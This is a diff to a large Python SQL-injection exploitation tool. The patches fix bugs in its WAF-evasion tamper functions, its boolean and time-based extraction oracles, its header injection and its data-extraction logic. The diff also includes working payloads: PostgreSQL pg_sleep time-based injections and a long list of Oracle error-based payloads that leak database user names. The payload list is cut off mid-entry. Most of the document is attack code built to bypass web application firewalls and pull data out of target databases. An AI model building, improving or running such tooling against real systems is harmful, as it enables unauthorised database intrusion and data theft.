@@ -20125,18 +20125,28 @@ class AdaptiveExtractionEngine:
             try:
                 # Attempt extraction
                 result = await extraction_func(*args, **kwargs)
-                
-                # Monitor response
-                status_code = kwargs.get('status_code', 200)
-                response_text = kwargs.get('response_text', '')
-                
+
+                # BUG-2 FIX: extraction_func may return either the extracted data
+                # directly, or a (data, status_code, body) tuple carrying real HTTP
+                # metadata.  Previously kwargs['status_code'] / kwargs['response_text']
+                # were always missing → monitor_response always received (200, "") →
+                # WAF block detection never fired → recovery_engine never invoked.
+                _actual_result = result
+                _waf_status = 200
+                _waf_body = ""
+                if isinstance(result, tuple) and len(result) == 3:
+                    _actual_result, _waf_status, _waf_body = result
+                elif isinstance(result, tuple) and len(result) == 2:
+                    _actual_result, _waf_status = result
+
+                # Monitor response (BUG-2 FIX: use real HTTP metadata when available)
                 pattern = self.waf_detector.monitor_response(
-                    status_code=status_code,
-                    response_text=response_text
+                    status_code=_waf_status,
+                    response_text=str(_waf_body) if _waf_body else ""
                 )
-                
+
                 # Check if result indicates success
-                if self._is_successful_result(result):
+                if self._is_successful_result(_actual_result):
                     self.bypass_pool.record_success()
                     self.successful_extractions += 1
                     return result
@@ -20146,31 +20156,35 @@ class AdaptiveExtractionEngine:
                     # Attempt recovery
                     recovery_attempts += 1
                     self.recoveries_attempted += 1
-                    
+
                     failure_rate = self.waf_detector.get_failure_rate()
                     recovery = await self.recovery_engine.execute_recovery(
                         pattern,
                         failure_rate
                     )
-                    
+
                     if recovery.success:
                         self.recoveries_successful += 1
                         self.recovery_engine.record_success(recovery.strategy)
-                        
+
                         # Reset detector after successful recovery
                         self.waf_detector.reset()
-                        
+
                         # Update extraction parameters if needed
                         if recovery.new_delay:
                             kwargs['delay'] = recovery.new_delay
                         if recovery.new_payload:
                             kwargs['payload'] = recovery.new_payload
-                        
+
                         # Retry with recovered settings
                         continue
                     else:
                         print(f"[!] [Recovery] Strategy '{recovery.strategy.value}' failed")
-                
+                else:
+                    # BUG-1 FIX: no WAF pattern detected but extraction still failed —
+                    # increment counter to prevent infinite loop when result is always None
+                    recovery_attempts += 1
+
                 # Record failure
                 self.bypass_pool.record_failure()
                 
@@ -21230,17 +21244,27 @@ def is_garbage_data(extracted_string: str) -> bool:
     Returns:
         True if data appears to be garbage
     """
+    # BUG-5 FIX: empty string "" is a valid extraction result (empty column value).
+    # Only None is truly missing/garbage.
+    if extracted_string is None:
+        return True
     if not extracted_string:
-        return True  # Empty/None is garbage
+        return False  # "" is valid — empty column, not garbage
     if not extracted_string.strip():
         return True  # Whitespace-only is garbage
-    
+
     # Layer 1: All same character (e.g., "aaaaaaa")
     if len(set(extracted_string)) == 1 and len(extracted_string) > 3:
         return True
-    
+
     # Layer 2: Too many non-printable characters (>20%)
-    non_printable = sum(1 for c in extracted_string if ord(c) < 32 or ord(c) > 126)
+    # BUG-4 FIX: only count true C0 control chars (0-31 excl. tab/CR/LF) and DEL (127)
+    # as non-printable.  Extended ASCII (128-255) can appear in real data (accented
+    # characters, Latin-1 encoded values) and matches validate_char's acceptance range.
+    non_printable = sum(
+        1 for c in extracted_string
+        if (ord(c) < 32 and c not in '\t\n\r') or ord(c) == 127
+    )
     if len(extracted_string) > 0 and non_printable / len(extracted_string) > 0.2:
         return True
     
@@ -21249,14 +21273,17 @@ def is_garbage_data(extracted_string: str) -> bool:
     if len(extracted_string) > 0 and null_bytes > len(extracted_string) * 0.1:
         return True
     
-    # Layer 4: Repeated pattern detection (e.g., "ababab")
+    # Layer 4: Repeated pattern detection (e.g., "ababababab")
+    # BUG-6 FIX: require >= 3 complete repetitions AND the string must fully equal
+    # the repeated pattern (not just start with it).  The old "startswith" check
+    # flagged "abcabc" (only 2 reps) and legitimate data like "go go go" as garbage.
     if len(extracted_string) > 10:
         for pattern_len in [2, 3, 4, 5]:
             if pattern_len >= len(extracted_string):
                 break
             pattern = extracted_string[:pattern_len]
-            expected = pattern * (len(extracted_string) // pattern_len)
-            if extracted_string.startswith(expected):
+            reps = len(extracted_string) // pattern_len
+            if reps >= 3 and extracted_string == pattern * reps:
                 return True
     
     # Layer 5: Common error/debug/NULL strings (garbage from failed extraction)
@@ -21341,14 +21368,17 @@ class AdaptiveRPMLearner:
         self.consecutive_429s += 1
         self.consecutive_oks = 0
         
-        if self.consecutive_429s >= 2:
+        # BUG-9 FIX: react to the FIRST 429, not just the second.
+        # A single isolated 429 is already a signal that the current RPM is too high;
+        # waiting for a second one means we've already sent too many blocked requests.
+        if self.consecutive_429s >= 1:
             # Too fast - reduce max bound
             self.max_safe_rpm = self.current_rpm
             self.current_rpm = (self.min_safe_rpm + self.max_safe_rpm) // 2
-            
-            print(f"[RPM Learner] Too fast! Reducing: {self.max_safe_rpm}  {self.current_rpm} RPM", 
+
+            print(f"[RPM Learner] Too fast! Reducing: {self.max_safe_rpm}  {self.current_rpm} RPM",
                   flush=True)
-            
+
             # Reset confidence
             self.confidence = max(0.0, self.confidence - 0.2)
     
@@ -24856,9 +24886,12 @@ class SQLSyntaxValidator:
                         bracket_depth -= 1
                         if bracket_depth < 0:
                             return (False, "Unmatched closing bracket")
-                if bracket_depth != 0:
-                    return (False, f"Unbalanced brackets (depth: {bracket_depth})")
-        
+                # BUG-8 FIX: do NOT reject unclosed brackets (bracket_depth > 0).
+                # Valid MSSQL injection payloads often end inside a quoted identifier
+                # like [column] where the closing ] is in the original query after our
+                # injection point.  Only extra closing brackets (negative depth) are
+                # invalid; unclosed opening brackets are acceptable in injection context.
+
         # All checks passed
         return (True, "")
 
@@ -24923,7 +24956,10 @@ class ScanSession:
         with open(path) as f: state=json.load(f)
         # FIX v16: validate session version to prevent silent data corruption
         # when a session from an older scanner version is resumed.
-        saved_ver = state.get("version", "0.0")
+        # BUG-3 FIX: state.get("version", "0.0") returns None when JSON has
+        # "version": null — dict.get() only uses the default when key is absent.
+        # Use `or "0.0"` to coerce None → "0.0" so int(split()[0]) never raises.
+        saved_ver = state.get("version") or "0.0"
         cur_major = int(self.VERSION.split(".")[0])
         saved_major = int(str(saved_ver).split(".")[0])
         if saved_major < cur_major - 1:
@@ -26921,7 +26957,9 @@ class AdvancedSpider:
                         sfp = await asyncio.wait_for(
                             self._engine.send("GET", m.group(1)), timeout=8)
                         if _validate_response(sfp, "response_body_check"):
-                            sbody = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction")
+                            # BUG-E1 FIX: was _safe_decode_body(fp, ...) — fp is the robots.txt
+                            # response, not the fetched sitemap.  Use sfp (the sitemap response).
+                            sbody = _safe_decode_body(sfp, encoding="utf-8", errors="replace", func_name="extraction")
                             urls.extend(re.findall(r'<loc>(.*?)</loc>', sbody)[:30])
                     except Exception:
                         pass  # TODO: Add logging for debugging
@@ -27737,19 +27775,22 @@ class XMLInjector:
     @staticmethod
     def inject_into_xml(xml_body, param_name, payload):
         """Replace a named element or attribute value with payload."""
+        # BUG-E9 FIX: embedding payload directly in re.sub replacement template causes
+        # backslash sequences in the payload (e.g. \1 from tamper chains, or literal \n)
+        # to be interpreted as group references or escape sequences.
+        # Use lambda replacement to pass payload as a literal string.
+
         # Element injection
         injected = re.sub(
             f'(<{param_name}[^>]*>)(.*?)(</{param_name}>)',
-            f'\\1{payload}\\3',
+            lambda m: m.group(1) + payload + m.group(3),
             xml_body, count=1, flags=re.DOTALL)
         if injected != xml_body:
             return injected
-        # FIX-REGEX: The original character class ["\'""] had a duplicated " char,
-        # causing the closing-group regex to match an extra empty group. The correct
-        # closing delimiter class is (["']) — single or double quote only.
+        # Attribute injection
         injected = re.sub(
             f'({param_name}=["\'])([^"\'"]*)(["\'])',
-            f'\\1{payload}\\3',
+            lambda m: m.group(1) + payload + m.group(3),
             xml_body, count=1)
         return injected
 
@@ -27926,18 +27967,25 @@ class HeaderDiffOracle:
                 diffs.append({"header": hdr, "true": v_t, "false": v_f})
         
         # Status code difference
-        if _get_safe_status_code(fp_true) != fp_false.status_code:
-            diffs.append({"header": "status", 
-                         "true": str(fp_true.status_code),
-                         "false": str(fp_false.status_code)})
-        
+        # BUG-H8 FIX: use _get_safe_status_code() for BOTH sides — direct attribute
+        # access on fp_false raises AttributeError when a dummy ResponseFingerprint is
+        # returned.  Also guard content_length with getattr to prevent TypeError on None.
+        _st_t = _get_safe_status_code(fp_true)
+        _st_f = _get_safe_status_code(fp_false)
+        if _st_t != _st_f:
+            diffs.append({"header": "status",
+                         "true": str(_st_t),
+                         "false": str(_st_f)})
+
         # Content-Length difference (even if header not present, use body size)
-        size_diff = abs(fp_true.content_length - fp_false.content_length)
-        size_pct = size_diff / max(fp_true.content_length, fp_false.content_length, 1)
+        _cl_t = getattr(fp_true, 'content_length', None) or 0
+        _cl_f = getattr(fp_false, 'content_length', None) or 0
+        size_diff = abs(_cl_t - _cl_f)
+        size_pct = size_diff / max(_cl_t, _cl_f, 1)
         if size_pct > 0.10:
-            diffs.append({"header": "body_size", 
-                         "true": str(fp_true.content_length),
-                         "false": str(fp_false.content_length)})
+            diffs.append({"header": "body_size",
+                         "true": str(_cl_t),
+                         "false": str(_cl_f)})
         
         return len(diffs) >= 2, len(diffs), diffs
 
@@ -29412,7 +29460,9 @@ class APIEndpointDiscovery:
                 jf = base + ju if ju.startswith("/") else ju if ju.startswith("http") else base + "/" + ju
                 try:
                     jfp = await asyncio.wait_for(engine.send("GET", jf), timeout=10)
-                    jb = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction") if isinstance(jfp.body, bytes) else str(jfp.body)
+                    # BUG-H1 FIX: was _safe_decode_body(fp, ...) — fp is the HTML base page,
+                    # not the fetched JS bundle.  Use jfp (the JS response) instead.
+                    jb = _safe_decode_body(jfp, encoding="utf-8", errors="replace", func_name="extraction") if isinstance(jfp.body, bytes) else str(jfp.body)
                     jeps = APIEndpointDiscovery.extract_js_endpoints(jb, base_url)
                     all_eps.extend(jeps); jc += len(jeps)
                 except Exception: continue
@@ -30109,18 +30159,29 @@ class TamperLib:
         return p.replace(" ","/**_**/")
 
     @staticmethod
-    def swap_and_or(p: str) -> str:
-        """Replace AND&& and OR|| (MySQL/MariaDB compatible operator aliases)."""
+    def swap_and_or(p: str, dbms: str = "") -> str:
+        """Replace AND/OR with MySQL-compatible operator aliases (&&/||).
+        BUG-E4 FIX: guard behind DBMS check — && and || are MySQL/MariaDB only.
+        PostgreSQL treats || as string concatenation; Oracle/MSSQL/SQLite reject &&.
+        When DBMS is unknown (empty) default to the safe cross-DBMS path (no-op)."""
+        if (dbms or "").upper() not in ("MYSQL", "MARIADB", "TIDB"):
+            return p  # non-MySQL: && and || are invalid — skip
         p = re.sub(r"\bAND\b","&&",p,flags=re.IGNORECASE)
         p = re.sub(r"\bOR\b","||",p,flags=re.IGNORECASE)
         return p
 
     @staticmethod
-    def concat_char_bypass(p: str) -> str:
-        """Replace short string literals with CHAR() concatenation."""
+    def concat_char_bypass(p: str, dbms: str = "") -> str:
+        """Replace short string literals with CHAR()/CHR() concatenation.
+        BUG-E6 FIX: CHAR(n,m,...) is MySQL/MSSQL syntax.  PostgreSQL and Oracle
+        use CHR(n)||CHR(m)||... (single-arg CHR with || concatenation).
+        SQLite uses CHAR(n,m,...) like MySQL."""
+        _d = (dbms or "").upper()
         def _to_char(m):
             s = m.group(1)
             if not s: return "''"
+            if _d in ("POSTGRESQL", "ORACLE"):
+                return "||".join(f"CHR({ord(c)})" for c in s)
             return "CHAR(" + ",".join(str(ord(c)) for c in s) + ")"
         return re.sub(r"'([^']{1,20})'", _to_char, p)
 
@@ -30142,8 +30203,13 @@ class TamperLib:
         return "".join("%0d%0a" if c == " " and random.random() > 0.35 else c for c in p)
 
     @staticmethod
-    def versioned_nested(p: str) -> str:
-        """Nested MySQL version comments: /*!50000.../*!40000...*/...*/"""
+    def versioned_nested(p: str, dbms: str = "") -> str:
+        """Nested MySQL version comments: /*!50000.../*!40000...*/...*/ — MySQL/MariaDB only.
+        BUG-E7 FIX: this syntax is MySQL-specific.  PostgreSQL, Oracle, MSSQL, and SQLite
+        treat /*! */ as a regular block comment; the nested structure creates malformed SQL.
+        Guard behind DBMS check; return p unchanged for all non-MySQL targets."""
+        if (dbms or "").upper() not in ("MYSQL", "MARIADB", "TIDB"):
+            return p
         for kw in ["union","select","from","where"]:
             ver1 = random.choice(["50000","40000","50500","50100"])
             ver2 = random.choice(["40000","40100","30000"])
@@ -30203,12 +30269,17 @@ class TamperLib:
         return p
 
     @staticmethod
-    def intersect_except(p: str) -> str:
+    def intersect_except(p: str, dbms: str = "") -> str:
         """Replace UNION [ALL] SELECT with INTERSECT/EXCEPT SELECT.
         WAF signatures overwhelmingly target UNION; INTERSECT/EXCEPT are ignored.
-        Supported: PostgreSQL, MSSQL, Oracle, SQLite, MySQL 8.0+, MariaDB 10.3+."""
-        _alts = ['INTERSECT SELECT', 'EXCEPT SELECT',
-                 'INTERSECT ALL SELECT', 'EXCEPT ALL SELECT']
+        BUG-E5 FIX: INTERSECT ALL and EXCEPT ALL are NOT supported in SQLite.
+        Only offer the ALL variants for PostgreSQL/MSSQL/MySQL8+/MariaDB10.3+."""
+        _d = (dbms or "").upper()
+        if _d in ("SQLITE",):
+            _alts = ['INTERSECT SELECT', 'EXCEPT SELECT']
+        else:
+            _alts = ['INTERSECT SELECT', 'EXCEPT SELECT',
+                     'INTERSECT ALL SELECT', 'EXCEPT ALL SELECT']
         return re.sub(r'\bUNION\s+(?:ALL\s+)?SELECT\b',
                       lambda _: random.choice(_alts), p, count=1, flags=_re.IGNORECASE)
 
@@ -30731,7 +30802,9 @@ class WAFDetector:
         LOG.info(f"WAF suspected (diff={diff:.3f}), fingerprinting")
         matched,conf=self._match(probe)
         result={"detected":True,"name":matched["name"] if matched else "unknown",
-                "tampers":_build_rotating_tamper_chain(matched["name"] if matched else ""),
+                # BUG-H11 FIX: use _build_full_tamper_chain (adds DBMS-specific tampers)
+                # instead of _build_rotating_tamper_chain (generic only, no DBMS augmentation).
+                "tampers":_build_full_tamper_chain(matched["name"] if matched else ""),
                 "confidence":conf,"status":probe.status_code,"diff_score":round(1-diff,3)}
         LOG.info(f"WAF: {result['name']} (confidence={conf:.0%})")
         return result
@@ -30943,7 +31016,10 @@ class ResponseDiffProfiler:
         if fp is None:
             return ("error", 0, "")
         status = getattr(fp, 'status_code', 0)
-        size = getattr(fp, 'body_length', 0) or len(getattr(fp, 'body', b''))
+        # BUG-H7 FIX: ResponseFingerprint has no 'body_length' attribute — the correct
+        # name is 'content_length'.  The old getattr always returned 0, falling back to
+        # len(body).  Use content_length to distinguish truncated bodies from full ones.
+        size = getattr(fp, 'content_length', 0) or len(getattr(fp, 'body', b''))
         # Bucket size to avoid minor variations
         size_bucket = (size // 100) * 100
         return (status, size_bucket)
@@ -32619,7 +32695,11 @@ class SQLMutationEngine:
         else:
             p = p_arg       # instance call: self.waf_bypass_operator_sub(payload)
             _dbms = getattr(self_or_p, 'dbms', '') or ''
-        _is_mysql = _dbms.lower() in ('mysql', 'mariadb', 'tidb', 'generic', '')
+        # BUG-E2 FIX: removed '' from MySQL allowlist.  When this method is called as
+        # a static (layer-7 lambda passes only the payload, no self) the dbms is '' and
+        # the old code treated unknown DBMS as MySQL, enabling || and && for PostgreSQL/
+        # Oracle/MSSQL targets where those operators have different semantics.
+        _is_mysql = _dbms.lower() in ('mysql', 'mariadb', 'tidb', 'generic')
         ops = [
             # BUG-WAFBYPASS-LAYER7-OR-CORRUPTION FIX: Only offer && (MySQL-only
             # bitwise AND as logical AND) and || (MySQL-only logical OR) when the
@@ -33504,7 +33584,7 @@ class SQLMutationEngine:
                         TamperLib.randomnoise,            # harmless noise tokens
                         TamperLib.commentbeforeparens,    # /**/ before (
                         TamperLib.comment_content,        # fill comments with random words
-                        TamperLib.versioned_nested,       # /*!50000 */ nested versioned
+                        lambda p: TamperLib.versioned_nested(p, self.dbms),  # DBMS-aware /*!50000 */ (BUG-E7 FIX)
                         TamperLib.versionedmorekeywords,  # /*!50000SELECT*/ style
                         TamperLib.modsecurityzeroversioned,# /*!0*/ ModSecurity bypass
                         TamperLib.versionedkeywords,      # /*!SELECT*/ style
@@ -33541,9 +33621,9 @@ class SQLMutationEngine:
                         # ALL characters — e.g. 'A'→'&#65;') which was defined in TamperLib but
                         # entirely absent from _tl_choices. This restores full 70-slot diversity.
                         TamperLib.htmlencode_all,         # ALL chars → &#NN; HTML entities (was duplicate numericobfuscate)
-                        TamperLib.swap_and_or,            # AND ↔ OR swap
+                        lambda p: TamperLib.swap_and_or(p, self.dbms),            # DBMS-aware AND↔OR swap (BUG-E4 FIX)
                         TamperLib.semantic_eq,            # = N → IN (N) or BETWEEN
-                        TamperLib.intersect_except,       # UNION → INTERSECT/EXCEPT
+                        lambda p: TamperLib.intersect_except(p, self.dbms),  # DBMS-aware UNION→INTERSECT/EXCEPT (BUG-E5 FIX)
                         TamperLib.math_wrap,              # numeric → 0+N or N*1
                         TamperLib.subquery_wrap,          # val → (SELECT val)
                         TamperLib.case_expression,        # pred → CASE WHEN pred THEN 1 END
@@ -33581,7 +33661,7 @@ class SQLMutationEngine:
                         # a structurally distinct transform that was defined in TamperLib but
                         # entirely absent from _tl_choices.
                         TamperLib.sp_password,            # MSSQL SP_PASSWORD audit bypass (was duplicate versionedkeywords)
-                        TamperLib.concat_char_bypass,     # string → CONCAT(CHAR...)
+                        lambda p: TamperLib.concat_char_bypass(p, self.dbms),  # DBMS-aware CHAR/CHR concat (BUG-E6 FIX)
                         # BUG-A2-FIX [Req 6/11]: Wire waf_bypass_exotic and apply_random_waf_bypass
                         # into the TamperLib pipeline. Both are SQLMutationEngine methods defined but
                         # NEVER called from mutate_all(). waf_bypass_exotic delegates to
@@ -33618,7 +33698,17 @@ class SQLMutationEngine:
                     else:
                         # Subsequent calls: reuse cached static + fresh instance-bound lambdas.
                         # This avoids allocating 73+ TamperLib + 7 V18 object refs on every miss.
+                        # BUG-E3 FIX: numericobfuscate lambda was missing from this rebuild —
+                        # cache only stored static refs; lambdas are excluded by the <lambda filter
+                        # but must be explicitly re-added here. Also add the newly DBMS-aware
+                        # lambdas for swap_and_or, versioned_nested, intersect_except,
+                        # concat_char_bypass which replaced their static refs (BUG-E4/E5/E6/E7 FIX).
                         _tl_choices = list(_tl_static_cached) + [
+                            lambda p: TamperLib.numericobfuscate(p, self.dbms),          # BUG-E3 FIX: was missing
+                            lambda p: TamperLib.swap_and_or(p, self.dbms),               # BUG-E4 FIX
+                            lambda p: TamperLib.versioned_nested(p, self.dbms),          # BUG-E7 FIX
+                            lambda p: TamperLib.intersect_except(p, self.dbms),          # BUG-E5 FIX
+                            lambda p: TamperLib.concat_char_bypass(p, self.dbms),        # BUG-E6 FIX
                             lambda p: self.waf_bypass_exotic(p, self.dbms),
                             lambda p: self.apply_random_waf_bypass(p, self.dbms, intensity=2),
                         ]
@@ -47610,26 +47700,35 @@ class Enumerator:
                     # A stale/detection-phase oracle (calibrated on 1=1/1=2 SimHash probes)
                     # evaluates extraction SQL against a WAF challenge page → coin-flip True/False
                     # → garbage bits → garbage chars. Validate here to reject broken oracles.
-                    try:
-                        _san_true = await _bool_oracle("1=1")
-                        _san_false = await _bool_oracle("1=2")
-                        # FIX-BUG3: Proper oracle sanity check:
-                        # - `is True`/`is False` fails for numpy.bool_, integer 1/0, or any
-                        #   non-singleton True/False returned by oracle wrappers.
-                        # - None means "no result / indeterminate" (WAF block, timeout) — treat
-                        #   as inconclusive: if 1=1 returns None, oracle is unreachable; if 1=2
-                        #   returns None, oracle may still work (false condition blocked by WAF
-                        #   is ambiguous — could be oracle not seeing it, or true condition only).
-                        # Accept only when: 1=1 is truthy (not None, not False) AND 1=2 is
-                        # explicitly falsy (False or 0, but NOT None which is indeterminate).
-                        if (_san_true is not None and _san_false is not None
-                                and bool(_san_true) and not bool(_san_false)):
-                            _eval_fn = _bool_oracle
-                            _oracle_name = "mse_boolean"
-                        else:
-                            LOG.warning("[_extract_str] mse_boolean oracle failed sanity (1=1→%r, 1=2→%r); discarding", _san_true, _san_false)
-                    except Exception as _osan_e:
-                        LOG.warning("[_extract_str] mse_boolean oracle sanity raised: %s; discarding", _osan_e)
+                    # BUG-ORACLE-SANITY-RETRY FIX: retry up to 3 times before discarding.
+                    # WAF responses are non-deterministic; a single probe-pair can fail because
+                    # of cache/rate-limit jitter even when the oracle is valid.
+                    _san_true = _san_false = None
+                    for _san_attempt in range(3):
+                        try:
+                            _san_true = await _bool_oracle("1=1")
+                            _san_false = await _bool_oracle("1=2")
+                            # Accept only when: 1=1 truthy AND 1=2 explicitly falsy (not None)
+                            if (_san_true is not None and _san_false is not None
+                                    and bool(_san_true) and not bool(_san_false)):
+                                _eval_fn = _bool_oracle
+                                _oracle_name = "mse_boolean"
+                                break
+                            if _san_attempt < 2:
+                                LOG.debug("[_extract_str] oracle sanity attempt %d failed "
+                                          "(1=1→%r, 1=2→%r); retrying",
+                                          _san_attempt + 1, _san_true, _san_false)
+                                await asyncio.sleep(0.5)
+                        except Exception as _osan_e:
+                            if _san_attempt == 2:
+                                LOG.warning("[_extract_str] mse_boolean oracle sanity raised "
+                                            "after 3 attempts: %s; discarding", _osan_e)
+                            else:
+                                await asyncio.sleep(0.5)
+                    if not _eval_fn:
+                        LOG.warning("[_extract_str] mse_boolean oracle failed sanity after "
+                                    "3 attempts (1=1→%r, 1=2→%r); discarding",
+                                    _san_true, _san_false)
         
         if not _eval_fn:
             # BUG-EXTR-1 FIX: Before giving up, attempt self-calibration of a
@@ -50395,6 +50494,7 @@ class _HTTPHeaderInjectorV1:
                 _ht_outer_stopped = False  # BUG-4B FIX: propagate stop from inner loops upward
                 for _ht_scan_dbms in _ht_list:
                     if _SCAN_STOPPED[0] or _ht_outer_stopped: break
+                    _ht_timings = []  # BUG-TH-FROZEN FIX: track per-DBMS timings to detect frozen WAF cache
                     # BUG-2C FIX: Use _get_cascade_payloads (TH = Timebased-first, all 10 categories)
                     for payload in _get_cascade_payloads(_ht_scan_dbms, 'TH', self.config.level):
                         if _SCAN_STOPPED[0]:
@@ -50424,6 +50524,17 @@ class _HTTPHeaderInjectorV1:
                                 break
                             await _apply_request_delay(self.config, None, False)
                             fp=await self.engine.send(method,url,data=data,headers=h)
+                            # BUG-TH-FROZEN FIX: detect WAF response caching (all identical timings → no signal)
+                            _ht_timings.append(fp.elapsed_ms)
+                            if len(_ht_timings) >= 5:
+                                _ht_mean_t = sum(_ht_timings) / len(_ht_timings)
+                                _ht_cv = (sum((x - _ht_mean_t) ** 2 for x in _ht_timings) / len(_ht_timings)) ** 0.5 / max(_ht_mean_t, 1.0)
+                                if _ht_cv < 0.05 and _ht_mean_t > 0:
+                                    LOG.warning("[TH-FrozenCache] %r: %d probes all within 5%% of %.0fms (CV=%.3f) — WAF caching, aborting TH",
+                                                header_name, len(_ht_timings), _ht_mean_t, _ht_cv)
+                                    print(f"[!]     TH {header_name!r}: frozen timing (mean={_ht_mean_t:.0f}ms CV={_ht_cv:.3f}) — WAF cache abort", flush=True)
+                                    _ht_outer_stopped = True
+                                    break
                             _ht_bl_mean = baseline.get("mean_timing", 200) if isinstance(baseline, dict) else 200
                             _ht_bl_std  = max(baseline.get("std_timing", 100) if isinstance(baseline, dict) else 100, 100)
                             expected = _ht_bl_mean + t * 1000 * 0.8
@@ -70068,9 +70179,10 @@ PAYLOADS_EXTENDED: Dict[str, Dict[str, List[str]]] = {
         "' AND (SELECT pg_sleep(5))-- -",
         "' AND (SELECT 1 WHERE pg_sleep(5) IS NOT NULL)-- -",
         
-        # CASE+pg_sleep
-        "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END)-- -",
-        "' AND (SELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE 0 END)-- -",
+        # CASE+pg_sleep — BUG-PG3 FIX: pg_sleep() returns void; ELSE 0 (integer) is a
+        # type mismatch. Use matching pg_sleep branches and IS NULL to handle void result.
+        "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NULL-- -",
+        "' AND (SELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NULL-- -",
         "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -",
         
         # Type casting with pg_sleep
@@ -108299,7 +108411,7 @@ class TechniqueCascadeEngine:
                             _half_ok   = ((_half_ms - _zero_ms) > _half_eff_ms * 0.40 and
                                           _half_ms > _bl_mean_t + max(10, _half_eff_ms * 0.20))
                             _double_ok = ((_double_ms - _zero_ms) > _double_eff_ms * 0.40 and
-                                          _double_ms > _half_ms * 1.10)
+                                          _double_ms > _half_ms * 1.50)  # BUG-D FIX: 1.10 too loose; SLEEP(2T) must be ≥1.5×SLEEP(T)
                             _zero_ok   = abs(_zero_ms - _bl_mean_t) < _bl_std_t * 2.8
 
                             # BUG-R3c FIX: measure a false probe HERE so the proportional
@@ -114513,7 +114625,12 @@ class TechniqueCascadeEngine:
             # With 4/5 multi-probe requirement all at >=160ms, CDN-cold uniformly "passes".
             # Fix: use full time_threshold for initial detection, 0.75× for confirmation,
             # 0.85× for multi-probe (consistent with T-technique multi-probe threshold fix).
-            _hq_thresh = time_threshold  # raised from 0.6× to full threshold
+            # BUG-HQ-THRESHOLD FIX: For pure cross-join HQ payloads (no sleep function),
+            # time_threshold stays at the caller default which can be as low as baseline+std.
+            # Enforce a minimum of 2× baseline so CDN jitter (typically <1.5× baseline) never
+            # satisfies the threshold without a genuine database delay.
+            _hq_bl_ms = baseline.get("mean_timing", 200) if isinstance(baseline, dict) else 200
+            _hq_thresh = max(time_threshold, _hq_bl_ms * 2.0, 1000.0)  # at least 2× baseline
             _hq_mean = baseline.get("mean_timing", 500)
             _hq_waf_fast = (_waf_blocked and fp.elapsed_ms < _hq_mean * 1.3)
             _hq_verdict = (" HIT" if fp.elapsed_ms >= _hq_thresh else
@@ -128255,7 +128372,7 @@ class DifferentialOracle:
         ms_score  = self._ms.score(r_true, r_false)
         emd_diff, emd_val = self._get_wem().compare(r_true.body, r_false.body)
         len_delta = abs(r_true.content_length - r_false.content_length)
-        status_diff = _get_safe_status_code(r_true) != r_false.status_code
+        status_diff = _get_safe_status_code(r_true) != _get_safe_status_code(r_false)  # BUG-B FIX
 
         n_signals = sum([ms_score > 0.35, emd_diff, len_delta > 50, status_diff])
 
@@ -128276,7 +128393,8 @@ class DifferentialOracle:
                 continue
             c_ms = self._ms.score(rt, rf)
             c_emd, _ = self._get_wem().compare(rt.body, rf.body)
-            if c_ms > 0.30 or c_emd:
+            c_len = abs((getattr(rt, 'content_length', 0) or 0) - (getattr(rf, 'content_length', 0) or 0))
+            if c_ms > 0.35 and (c_emd or c_len > 50):  # BUG-A FIX: stricter than detection threshold
                 hits += 1
 
         confidence = 0.55 + (hits / 3) * 0.35
@@ -159685,8 +159803,12 @@ class WassersteinResponseOracle:
         """
         if not body1 and not body2:
             return 0.0
-        cdf1 = cls._byte_cdf(body1)
-        cdf2 = cls._byte_cdf(body2)
+        # BUG-C FIX: _byte_cdf_cached() was added as a performance fix but wasserstein1()
+        # was still calling the uncached _byte_cdf() — the cache was dead code.
+        # Use the cached version so repeated bodies (baseline, true, false) don't
+        # recompute O(n) CDF on every confirmation round.
+        cdf1 = cls._byte_cdf_cached(body1)
+        cdf2 = cls._byte_cdf_cached(body2)
         return sum(abs(a - b) for a, b in zip(cdf1, cdf2)) / 256.0
 
     def compare(self, true_body: bytes, false_body: bytes,
@@ -168495,7 +168617,7 @@ ORACLE_STANDARD_PAYLOADS = ["AND NOT (MIN(1)INLTRIM('  a'))", "AND CASE WHEN LPA
 # 300 payloads: CAST-to-NUMBER, CAST-to-DATE/TIMESTAMP/INTERVAL/CLOB/BLOB,
 # XMLELEMENT, XMLATTRIBUTES, TO_NUMBER — all with AND/OR/comma variants.
 
-ORACLE_ERROR_PAYLOADS = [' AND 1=(SELECT CAST(USER AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST(USER AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST(USER AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST(USER AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST(CURRENT_USER AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST(CURRENT_USER AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST(CURRENT_USER AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST(CURRENT_USER AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST(SESSION_USER AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST(SESSION_USER AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST(SESSION_USER AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST(SESSION_USER AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST(SYSDATE AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST(SYSDATE AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST(SYSDATE AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST(SYSDATE AS NUMBER(10,2)) FROM DUAL)-- -', ' AND 1=(SELECT CAST(SYSTIMESTAMP AS NUMBER(10,2)) FROM DUAL)-- -', "' AND 1=(SELECT CAST(SYSTIMESTAMP AS NUMBER(10,2)) FROM DUAL)-- -", ' OR 1=(SELECT CAST(SYSTIMESTAMP AS NUMBER(10,2)) FROM DUAL)-- -', ' ,(SELECT CAST(SYSTIMESTAMP AS NUMBER(10,2)) FROM DUAL)-- -', ' 